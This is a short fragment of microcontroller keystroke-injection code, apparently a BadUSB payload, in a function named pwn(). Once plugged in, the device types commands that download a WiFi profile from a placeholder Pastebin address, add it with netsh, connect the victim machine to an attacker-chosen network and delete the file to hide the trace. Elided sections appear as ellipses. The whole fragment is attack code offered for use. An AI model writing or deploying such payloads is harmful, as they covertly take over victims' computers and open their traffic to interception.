...
void pwn()
{
 ...
 Keyboard.println("$client.DownloadFile('PASTEBIN','ESSID.xml')");
 Keyboard.println("netsh wlan add profile filename='ESSID.xml'");
 Keyboard.println("netsh wlan connect name=ESSID");
 Keyboard.println("del ESSID.xml");
